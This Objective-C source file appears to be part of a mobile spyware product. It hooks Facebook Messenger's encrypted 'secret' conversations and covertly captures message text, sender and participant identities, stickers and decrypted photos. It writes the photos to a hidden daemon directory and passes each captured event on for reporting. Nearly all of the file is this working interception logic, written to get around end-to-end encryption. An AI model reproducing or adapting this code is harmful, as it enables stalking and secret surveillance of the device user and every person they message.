//
//  FacebookSecretUtils.m
//  MSFSP
//
//  Created by Khaneid Hantanasiriskul on 9/28/2559 BE.
//
//

#import "FacebookSecretUtils.h"

#import "MNSecureThreadSummary.h"
#import "MNSecureMessage.h"
#import "MNSecureMessageContent.h"
#import "MNSecurePhotoContentInfo.h"
#import "MNSecureAttachmentRetrievalInfo.h"
#import "MNSecureMessagingService.h"
#import "MNSecurePhotoSource.h"
#import "MNImage.h"
#import "MNSecureOutgoingMessage.h"
#import "MNSecureOutgoingMessageContent.h"
#import "FBValueObjectPair.h"

#import "FacebookUtilsV2.h"
#import "FacebookSerialOperation.h"
#import "FacebookUtils.h"
#import "IMShareUtils.h"

#import "FxIMEvent.h"
#import "FxVoIPEvent.h"
#import "FxRecipient.h"
#import "FxIMGeoTag.h"
#import "DateTimeFormat.h"
#import "FxAttachment.h"
#import "DaemonPrivateHome.h"

#import "FBMThreadParticipationInfo.h"

//Facebook Messenger 96.0
#import "MNSecurePhotoContentInfo+96-0.h"
#import "MNSecurePhotoSource+96-0.h"

#import <objc/runtime.h>
#import <CommonCrypto/CommonDigest.h>

static FacebookSecretUtils *_FacebookSecretUtils = nil;

@implementation FacebookSecretUtils

@synthesize mMNSecureMessagingService;

+ (id) sharedFacebookSecretUtils {
    if (_FacebookSecretUtils == nil) {
        _FacebookSecretUtils = [[FacebookSecretUtils alloc] init];
    }
    return (_FacebookSecretUtils);
}


#pragma mark - IM capture (entry point method)
+ (void) captureFacebookIMEventWithSecureThreadSummary: (MNSecureThreadSummary *) aThread
                                         secureMessage: (MNSecureMessage *) aMessage {
    @try {
        DLog(@"****************   captureFacebookIMEventWithSecureThreadSummary    ***************")
        
        /*
         FBMSPMessage for Messenger 21.1
         FBMPushedMessage for Messenger 19.1
         FBMThreadSummary for Messenger 77.0
         */
        DLog(@"aThread, object %@ type %@", aThread, [aThread class])
        DLog(@"aMessage, object %@ type %@", aMessage, [aMessage class]);
        
        NSString * imServiceID		= @"fbk";
        NSString * message          = nil;
        NSString * senderName		= nil;
        NSString * senderID			= nil;
        NSString * senderStatus		= nil;
        NSData   * senderPhoto		= nil;
        NSString * convID			= nil;
        NSString * convName			= nil;
        NSData   * convPhoto		= nil;
        FxEventDirection direction  = kEventDirectionIn;
        NSMutableArray *recipents   = [NSMutableArray array];
        NSArray * attachments       = [NSArray array];
        FxIMMessageRepresentation textRepres = kIMMessageText;
        
        NSString *meUserID = [FacebookUtilsV2 meUserID];
        id messageContent = nil;
        
        Class $MNSecureOutgoingMessage = objc_getClass("MNSecureOutgoingMessage");
        
        if ([aMessage isMemberOfClass:$MNSecureOutgoingMessage]) {
            messageContent = aMessage.content;
            
            FBStringWithRedactedDescription *textMessage = nil;
            object_getInstanceVariable(messageContent, "_text", (void **)&textMessage );
            
            Class $FBStringWithRedactedDescription = objc_getClass("FBStringWithRedactedDescription");
            
            message = [textMessage rawContentValueOnlyToBeVisibleToUser];
            DLog(@"message %@", message);
            
            senderID    = meUserID;
            direction = kEventDirectionOut;
        }
        else {
            messageContent = aMessage.content;
            
            FBStringWithRedactedDescription *textMessage = nil;
            object_getInstanceVariable(messageContent, "_message_text", (void **)&textMessage );
            
            Class $FBStringWithRedactedDescription = objc_getClass("FBStringWithRedactedDescription");
            
            message = [textMessage rawContentValueOnlyToBeVisibleToUser];
            DLog(@"message %@", message);

            senderID    = [aMessage senderId];
            long long sendTimestamp = [FacebookUtilsV2 sendTimestamp:aMessage];
            [[FacebookUtilsV2 sharedFacebookUtilsV2] setMLastMessageSendTimestamp:sendTimestamp];
            [FacebookUtilsV2 saveLastMessageSendTimestamp:sendTimestamp];
        }
        
        DLog(@"senderID %@", senderID);
        
        FBStringWithRedactedDescription *codeName = aThread.codeName;
        DLog(@"codeName %@", codeName);
        DLog(@"codeName raw %@", [codeName rawContentValueOnlyToBeVisibleToUser]);
        DLog(@"otherUserParticipationInfo %@", aThread.otherUserParticipationInfo);
        
        NSString *otherFbID = nil;
        object_getInstanceVariable(aThread, "_otherUserFbId", (void **)&otherFbID );
        DLog(@"otherFbID %@", otherFbID);
        
        if ([aMessage isMemberOfClass:$MNSecureOutgoingMessage]) {
            DLog(@"messageContent %@", messageContent);
        }
        else {
            id attachmentInfo = nil;
            object_getInstanceVariable(messageContent, "_messageAttachment_info", (void **)&attachmentInfo );
            DLog(@"attachmentInfo %@", attachmentInfo);

        }
        
        FBMThreadParticipationInfo *participantInfo = aThread.otherUserParticipationInfo;
        
        
        if (direction == kEventDirectionOut) { // Outgoing
            if ([[participantInfo userId] isEqualToString:senderID]) {
                senderName = [FacebookUtilsV2 userNameWithUserID:[participantInfo userId]];
            } else {
                FxRecipient *recipent = [[FxRecipient alloc] init];
                [recipent setRecipNumAddr:[participantInfo userId]];
                NSString *name = [FacebookUtilsV2 userNameWithUserID:[participantInfo userId]];;
                [recipent setRecipContactName:name];
                [recipent setMPicture:nil];
                [recipents addObject:recipent];
                [recipent release];
            }
            
            //Facebook Messenger 88.0 fb participants array does not contain self;
            if (!senderName) {
                    //senderName = [self userNameWithUserID:[participantInfo userId] withUserSet:[[self sharedFacebookUtilsV2] mFBMUserSet]];
                senderName = [FacebookUtilsV2 userNameWithUserID:meUserID];
            }
        }
        else { // Incoming
            BOOL foundSelf = NO;;
            
            if ([[participantInfo userId] isEqualToString:senderID]) {
                senderName = [FacebookUtilsV2 userNameWithUserID:[participantInfo userId]];
            } else {
                FxRecipient *recipent = [[FxRecipient alloc] init];
                [recipent setRecipNumAddr:[participantInfo userId]];
                NSString *name = [FacebookUtilsV2 userNameWithUserID:[participantInfo userId]];
                [recipent setRecipContactName:name];
                [recipent setMPicture:nil];
                if ([[participantInfo userId] isEqualToString:meUserID]) {
                    [recipents insertObject:recipent atIndex:0];
                    foundSelf = YES;
                } else {
                    [recipents addObject:recipent];
                }
                [recipent release];
            }
            
                //Facebook Messenger 88.0 fb participants array does not contain self;
            if (!foundSelf) {
                FxRecipient *recipent = [[FxRecipient alloc] init];
                [recipent setRecipNumAddr:meUserID];
                
                NSString *name = [FacebookUtilsV2 userNameWithUserID:meUserID];
                
                [recipent setRecipContactName:name];
                [recipent setMPicture:nil];
                [recipents insertObject:recipent atIndex:0];
                [recipent release];
            }
        }
        
                    // Calulate name of conversation
                if (convName == nil) {
                    DLog(@"Construct coversation name");
                    if ([recipents count] <= 1) { // Never less than 1 otherwise there is a bug
                        if (direction == kEventDirectionOut) { // Out
                            convName = [[recipents objectAtIndex:0] recipContactName];
                        } else { // In
                            convName = senderName;
                        }
                    } else {
                        NSMutableArray *convNames = [[NSMutableArray alloc] init];
                        if (direction == kEventDirectionOut) { // Out
                            for (FxRecipient *recipient in recipents) {
                                [convNames addObject:[recipient recipContactName]];
                            }
                        } else { // In
                            [convNames addObject:senderName];
                            for (NSInteger i = 1; i < [recipents count]; i++) { // Not include the target account, index from 1
                                [convNames addObject:[[recipents objectAtIndex:i] recipContactName]];
                            }
                        }
                        convName = [convNames componentsJoinedByString:@","];
                        [convNames release];
                    }
                }
        
        convName = [NSString stringWithFormat:@"🔒 %@", convName];
        
            //Note
            //No unique id from thread object
            //Should generate hash from all participants id for use as conversation id
            if (convID == nil) {
                DLog(@"Construct coversation id");
                NSMutableArray *convIds = [[NSMutableArray alloc] init];
                
                [convIds addObject:senderID];
                
                for (FxRecipient *recipient in recipents) {
                    [convIds addObject:[recipient recipNumAddr]];
                }
                
                [convIds sortUsingSelector:@selector(localizedCaseInsensitiveCompare:)];
                NSString *sumIDString = [convIds componentsJoinedByString:@""];
                convID = sumIDString;
            }
        
            DLog (@"---------------------------------------------------");
            DLog (@"direction->%d", direction);
            DLog (@"senderID->%@", senderID);
            DLog (@"senderName->%@", senderName);
            DLog (@"senderStatus->%@", senderStatus);
            DLog (@"senderPhoto->%@", senderPhoto);
            DLog (@"imServiceID->%@", imServiceID);
            DLog (@"message->%@", message);
            DLog (@"convID->%@", convID);
            DLog (@"convName->%@", convName);
            DLog (@"convPhoto->%@", convPhoto);
                
            DLog(@"recipents->%@", recipents);

            /****************************************************************************
                Initiate FxIMEvent
            *****************************************************************************/
            FxIMEvent *imEvent = [[FxIMEvent alloc] init];
            [imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
            [imEvent setMIMServiceID:imServiceID];
            [imEvent setMUserID:senderID];
            [imEvent setMUserDisplayName:senderName];
            [imEvent setMUserStatusMessage:senderStatus];
            [imEvent setMUserPicture:senderPhoto];
            [imEvent setMDirection:(FxEventDirection)direction];
            [imEvent setMMessage:message];
            [imEvent setMRepresentationOfMessage:textRepres];
            [imEvent setMParticipants:recipents];
            [imEvent setMAttachments:attachments];
            [imEvent setMServiceID:kIMServiceFacebook];
            [imEvent setMConversationID:convID];
            [imEvent setMConversationName:convName];
        
            // Utils fields...
            [imEvent setMMessageIdOfIM:[aMessage messageId]];
        
            NSArray *extraArgs  = [[NSArray alloc] initWithObjects:aMessage, imEvent, nil];
            FacebookSerialOperation *fbSerialOperation = [[FacebookSerialOperation alloc] initWithArgs:extraArgs];
            [fbSerialOperation setMDelegate:self];
        
            [fbSerialOperation setMSelector:@selector(checkHaveAttachmentSecret:)];
            [[[FacebookUtilsV2 sharedFacebookUtilsV2] mQueue] addOperation:fbSerialOperation];
            [fbSerialOperation release];
        
            DLog(@"operations array %@", [[[FacebookUtilsV2 sharedFacebookUtilsV2] mQueue] operations]);
        
            [extraArgs release];
        
            [imEvent release];

    } @catch (NSException *exception) {
        DLog(@"Found Exception %@", exception);
    } @finally {
        //Done
    }
}

#pragma mark Attachments secret (For secret chat)
+ (void) checkHaveAttachmentSecret:(NSArray *)aArgs {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    [aArgs retain];
    @try {
        MNSecureMessage *fbMessage   = [aArgs objectAtIndex:0];
        FxIMEvent *imEvent      = [aArgs objectAtIndex:1];
        
//        NSString *textMessage = nil;
//        
//        Class $FBMStringWithRedactedDescription = objc_getClass("FBMStringWithRedactedDescription");
//        Class $FBStringWithRedactedDescription = objc_getClass("FBStringWithRedactedDescription");
//        
//        if ([[fbMessage text] isKindOfClass:[NSString class]]) {
//            textMessage = [fbMessage text];
//        } else if ([[fbMessage text] isKindOfClass:[$FBMStringWithRedactedDescription class]]) {
//            textMessage = [(FBMStringWithRedactedDescription *)[fbMessage text] rawContentValueOnlyToBeVisibleToUser];
//        } else if ([[fbMessage text] isKindOfClass:[$FBStringWithRedactedDescription class]]) {
//            textMessage = [(FBStringWithRedactedDescription *)[fbMessage text] rawContentValueOnlyToBeVisibleToUser];
//        }
//        
//        if ([[imEvent mMessage] length] == 0) {
//            DLog(@"Reset text message from (%@) to (%@)", [imEvent mMessage], textMessage);
//            [imEvent setMMessage:textMessage];
//        }
        
        DLog(@"imEvent mMessage %@", imEvent.mMessage);
        
        [self captureIMEventStickerIfExist:imEvent fbMessage:fbMessage];
        [self captureIMEventAttachmentsIfExist:imEvent fbMessage:fbMessage];
        
        DLog(@"IM Representation (BEFORE): %d", [imEvent mRepresentationOfMessage])
            // if no Text Message, remove text bitwise
        if  (![imEvent mMessage] || [[imEvent mMessage] length] == 0) {
            if ([imEvent mRepresentationOfMessage] & kIMMessageText) {
                [imEvent setMRepresentationOfMessage:[imEvent mRepresentationOfMessage] - 1];
            }
        }
        DLog(@"IM Representation (AFTER): %d", [imEvent mRepresentationOfMessage])
        
        [FacebookUtils sendFacebookEvent:imEvent];
        
        // Make sure after signal SIGHUP (mystery taking photo & download the photo) we don't capture the same message
        NSString *uniqueID = [fbMessage messageId];
        [[FacebookUtilsV2 sharedFacebookUtilsV2] storeUniqueMessageID:uniqueID];
    }
    @catch (NSException *exception) {
        DLog(@"Capture attachment in Facebook/Facebook Messenger exception, %@", exception);
    }
    @finally {
        ;
    }
    
    [aArgs release];
    [pool release];
}

+ (void) captureIMEventStickerIfExist: (FxIMEvent *) aIMEvent fbMessage: (MNSecureMessage *) aFBMessage {
    NSMutableArray *fxAttachments = [NSMutableArray arrayWithArray:[aIMEvent mAttachments]];
    
    MNSecureMessageContent* messageContent = aFBMessage.content;
    
    Class $MNSecureOutgoingMessage = objc_getClass("MNSecureOutgoingMessage");
    unsigned long long stickerID = 0;
    
    if ([aFBMessage isMemberOfClass:$MNSecureOutgoingMessage]) {
        DLog(@"messageContent %@", messageContent);
        object_getInstanceVariable(messageContent, "_sticker", (void **)&stickerID );
    }
    else {
        id attachmentInfo = nil;
        object_getInstanceVariable(messageContent, "_messageAttachment_info", (void **)&attachmentInfo );
        DLog(@"attachmentInfo %@", attachmentInfo);
        if (attachmentInfo) {
            object_getInstanceVariable(attachmentInfo, "_sticker", (void **)&stickerID );
        }
    }
    
    if (stickerID > 0) {
        NSData *stickerData = [FacebookUtilsV2 stickerDataWithStickerID:stickerID];
        
        if (stickerData) {
            FxAttachment *fxAttachment = [[FxAttachment alloc] init];
            [fxAttachment setMThumbnail:stickerData];
            [fxAttachments addObject:fxAttachment];
            [fxAttachment release];
            
            [aIMEvent setMRepresentationOfMessage:kIMMessageSticker];
        } else {
            DLog(@"Cannot get sticker data from sticker...")
        }
    }
    else {
        DLog(@"Not a sticker")
    }

    [aIMEvent setMAttachments:fxAttachments];
}

+ (void) captureIMEventAttachmentsIfExist: (FxIMEvent *) aIMEvent fbMessage: (MNSecureMessage *) aFBMessage {
    NSMutableArray *fxAttachments = [NSMutableArray arrayWithArray:[aIMEvent mAttachments]];
    MNSecureMessageContent* messageContent = aFBMessage.content;
    
    Class $MNSecureOutgoingMessage = objc_getClass("MNSecureOutgoingMessage");
    NSArray *photos = nil;
    
    if ([aFBMessage isMemberOfClass:$MNSecureOutgoingMessage]) {//Out going
        DLog(@"messageContent %@", messageContent);
        object_getInstanceVariable(messageContent, "_photos", (void **)&photos );
        
        DLog(@"photos %@", photos);
        
        [photos enumerateObjectsUsingBlock:^(FBValueObjectPair *objectPair, NSUInteger idx, BOOL * _Nonnull stop) {
            UIImage *actualImage = objectPair.second;
            DLog(@"actualImage %@", actualImage);
            UIImage *orientedImage= [FacebookSecretUtils rotateUIImage:actualImage];
            
            NSData *photoData = UIImageJPEGRepresentation(orientedImage, 1.0);
            
            NSString *messageId = [aFBMessage messageId];
            NSString *fbAttachmentPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imFacebook/"];
            fbAttachmentPath = [NSString stringWithFormat:@"%@%f_%@_%lu.jpeg", fbAttachmentPath, [[NSDate date] timeIntervalSince1970], messageId, (idx+1)];
            
            if (![photoData writeToFile:fbAttachmentPath atomically:YES]) {
                    // iOS 9, Sandbox
                fbAttachmentPath = [IMShareUtils saveData:photoData toDocumentSubDirectory:@"/attachments/imFacebook/" fileName:[fbAttachmentPath lastPathComponent]];
            }

            FxAttachment *fxAttachment = [[FxAttachment alloc] init];
            [fxAttachment setFullPath:fbAttachmentPath];
            [fxAttachments addObject:fxAttachment];
            [fxAttachment release];
        }];
        
        if (photos.count > 0) {
            [aIMEvent setMRepresentationOfMessage:(kIMMessageNone | kIMMessageText)];
            [aIMEvent setMAttachments:fxAttachments];
        }
    }
    else {
        id attachmentInfo = nil;
        object_getInstanceVariable(messageContent, "_messageAttachment_info", (void **)&attachmentInfo );
        DLog(@"attachmentInfo %@", attachmentInfo);
        if (attachmentInfo) {
            object_getInstanceVariable(attachmentInfo, "_photos", (void **)&photos );
            
            DLog(@"photos %@", photos);
            if (photos.count > 0) {
                Class $MNSecurePhotoSource = objc_getClass("MNSecurePhotoSource");
                
                dispatch_semaphore_t sem = dispatch_semaphore_create(0);
                
                __block NSUInteger remainingPhoto = photos.count;
                
                
                [photos enumerateObjectsUsingBlock:^(MNSecurePhotoContentInfo *photoContentInfo, NSUInteger idx, BOOL * _Nonnull stop) {
                    DLog(@"photoContentInfo %@", photoContentInfo);
                    MNSecureAttachmentRetrievalInfo *retrievalInfo = photoContentInfo.retrievalInfo;
                    DLog(@"retrievalInfo %@", retrievalInfo);
                    
                    id queue = nil;
                    object_getInstanceVariable([[FacebookSecretUtils sharedFacebookSecretUtils] mMNSecureMessagingService], "_queue", (void **)&queue );
                    
                    MNSecurePhotoSource *photoSource = nil;
                    
                    if ([$MNSecurePhotoSource instancesRespondToSelector:@selector(initWithThreadKey:messageId:retrievalInfo:)]) {
                        photoSource = [[$MNSecurePhotoSource alloc] initWithThreadKey:aFBMessage.secureThreadKey messageId:aFBMessage.messageId retrievalInfo:retrievalInfo];
                    }
                    else {
                        photoSource = [[$MNSecurePhotoSource alloc] initWithThreadKey:aFBMessage.secureThreadKey messageId:aFBMessage.messageId retrievalInfo:retrievalInfo thumbnailData:photoContentInfo.thumbnailData];
                    }
          
                    DLog(@"[[FacebookSecretUtils sharedFacebookSecretUtils] mMNSecureMessagingService] %@", [[FacebookSecretUtils sharedFacebookSecretUtils] mMNSecureMessagingService]);
                    
                    [[[FacebookSecretUtils sharedFacebookSecretUtils] mMNSecureMessagingService] fetchImageFromSecurePhotoSource:photoSource queue:queue success:^(MNImage *image){
                        DLog(@"image %@", image);
                        UIImage *actualImage = nil;
                        object_getInstanceVariable(image, "_staticImage", (void **)&actualImage );
                        DLog(@"actualImage %@", actualImage);
                        DLog(@"imageOrientation %ld", (long)actualImage.imageOrientation);
                        
                        UIImage *orientedImage= [FacebookSecretUtils rotateUIImage:actualImage];
                        
                        NSData *photoData = UIImageJPEGRepresentation(orientedImage, 1.0);
                        
                        NSString *messageId = [aFBMessage messageId];
                        NSString *fbAttachmentPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imFacebook/"];
                        fbAttachmentPath = [NSString stringWithFormat:@"%@%f_%@_%lu.jpeg", fbAttachmentPath, [[NSDate date] timeIntervalSince1970], messageId, (idx+1)];
                        
                        if (![photoData writeToFile:fbAttachmentPath atomically:YES]) {
                                // iOS 9, Sandbox
                            fbAttachmentPath = [IMShareUtils saveData:photoData toDocumentSubDirectory:@"/attachments/imFacebook/" fileName:[fbAttachmentPath lastPathComponent]];
                        }
                        
                        FxAttachment *fxAttachment = [[FxAttachment alloc] init];
                        [fxAttachment setFullPath:fbAttachmentPath];
                        [fxAttachments addObject:fxAttachment];
                        [fxAttachment release];
                        
                        remainingPhoto--;
                        
                        if (remainingPhoto == 0) {
                            dispatch_semaphore_signal(sem);
                        }
                    } failure:^(NSError *error) {
                        DLog(@"error %@", error);
                        
                        remainingPhoto--;
                        
                        if (remainingPhoto == 0) {
                            dispatch_semaphore_signal(sem);
                        }
                    }];
                    
                    [photoSource release];
                }];
                
                dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);
                dispatch_release(sem);
                
                [aIMEvent setMRepresentationOfMessage:(kIMMessageNone | kIMMessageText)];
                [aIMEvent setMAttachments:fxAttachments];
            }
        }
    }
}


+ (NSString *)MD5StringFromString:(NSString *)aString {
    const char *cstr = [aString UTF8String];
    unsigned char result[16];
    CC_MD5(cstr, strlen(cstr), result);
    
    return [NSString stringWithFormat:
            @"%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X",
            result[0], result[1], result[2], result[3],
            result[4], result[5], result[6], result[7],
            result[8], result[9], result[10], result[11],
            result[12], result[13], result[14], result[15]
            ];
}

+ (UIImage*)rotateUIImage:(UIImage*)src {
    
        // No-op if the orientation is already correct
    if (src.imageOrientation == UIImageOrientationUp) return src ;
    
        // We need to calculate the proper transformation to make the image upright.
        // We do it in 2 steps: Rotate if Left/Right/Down, and then flip if Mirrored.
    CGAffineTransform transform = CGAffineTransformIdentity;
    
    switch (src.imageOrientation) {
        case UIImageOrientationDown:
        case UIImageOrientationDownMirrored:
            transform = CGAffineTransformTranslate(transform, src.size.width, src.size.height);
            transform = CGAffineTransformRotate(transform, M_PI);
            break;
            
        case UIImageOrientationLeft:
        case UIImageOrientationLeftMirrored:
            transform = CGAffineTransformTranslate(transform, src.size.width, 0);
            transform = CGAffineTransformRotate(transform, M_PI_2);
            break;
            
        case UIImageOrientationRight:
        case UIImageOrientationRightMirrored:
            transform = CGAffineTransformTranslate(transform, 0, src.size.height);
            transform = CGAffineTransformRotate(transform, -M_PI_2);
            break;
        case UIImageOrientationUp:
        case UIImageOrientationUpMirrored:
            break;
    }
    
    switch (src.imageOrientation) {
        case UIImageOrientationUpMirrored:
        case UIImageOrientationDownMirrored:
            transform = CGAffineTransformTranslate(transform, src.size.width, 0);
            transform = CGAffineTransformScale(transform, -1, 1);
            break;
            
        case UIImageOrientationLeftMirrored:
        case UIImageOrientationRightMirrored:
            transform = CGAffineTransformTranslate(transform, src.size.height, 0);
            transform = CGAffineTransformScale(transform, -1, 1);
            break;
        case UIImageOrientationUp:
        case UIImageOrientationDown:
        case UIImageOrientationLeft:
        case UIImageOrientationRight:
            break;
    }
    
        // Now we draw the underlying CGImage into a new context, applying the transform
        // calculated above.
    CGContextRef ctx = CGBitmapContextCreate(NULL, src.size.width, src.size.height,
                                             CGImageGetBitsPerComponent(src.CGImage), 0,
                                             CGImageGetColorSpace(src.CGImage),
                                             CGImageGetBitmapInfo(src.CGImage));
    CGContextConcatCTM(ctx, transform);
    switch (src.imageOrientation) {
        case UIImageOrientationLeft:
        case UIImageOrientationLeftMirrored:
        case UIImageOrientationRight:
        case UIImageOrientationRightMirrored:
                // Grr...
            CGContextDrawImage(ctx, CGRectMake(0,0,src.size.height,src.size.width), src.CGImage);
            break;
            
        default:
            CGContextDrawImage(ctx, CGRectMake(0,0,src.size.width,src.size.height), src.CGImage);
            break;
    }
    
        // And now we just create a new UIImage from the drawing context
    CGImageRef cgimg = CGBitmapContextCreateImage(ctx);
    UIImage *img = [UIImage imageWithCGImage:cgimg];
    CGContextRelease(ctx);
    CGImageRelease(cgimg);
    return img;
}


@end
